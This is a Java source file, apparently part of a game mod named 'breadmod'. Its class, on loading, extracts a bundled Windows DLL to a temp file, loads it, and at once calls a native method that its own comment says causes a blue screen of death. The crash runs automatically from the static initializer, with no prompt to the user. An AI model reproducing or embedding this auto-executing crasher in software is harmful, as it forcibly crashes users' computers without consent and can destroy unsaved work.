package breadmod.natives.windows;

import breadmod.natives.FailedToLoadNativeException;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;

/**
 * Microsoft Windows-specific native wrapper to run the crasher located in a.dll.
 */
public enum ACrasherWindows {
    ;

    static {
        try (
                final InputStream resource = ACrasherWindows.class.getResourceAsStream(
                        "/natives/win32/breadmod_natives_windows_ACrasherWindows.dll"
                )
        ) {
            assert resource != null;

            final long currentTimeMillis = System.currentTimeMillis();
            final String aName = String.valueOf(currentTimeMillis);

            final Path dllPath = Files.createTempFile(aName, ".dll");
            final File tempFile = dllPath.toFile();
            tempFile.deleteOnExit();

            final byte[] bytes = resource.readAllBytes();
            Files.write(dllPath, bytes);

            final String aLibraryAbsolutePath = dllPath.toAbsolutePath().toString();
            //noinspection LoadLibraryWithNonConstantString
            System.load(aLibraryAbsolutePath);

            run();
        } catch (final IOException e) {
            throw new FailedToLoadNativeException(e);
        }
    }

    /**
     * Runs the crasher located in a.dll.
     * <p>
     * <b>NOTE</b>: This causes a BSOD (blue screen of death) for Microsoft Windows computers.
     * Use with extreme caution!
     */
    @SuppressWarnings("NativeMethod")
    public static native void run();

}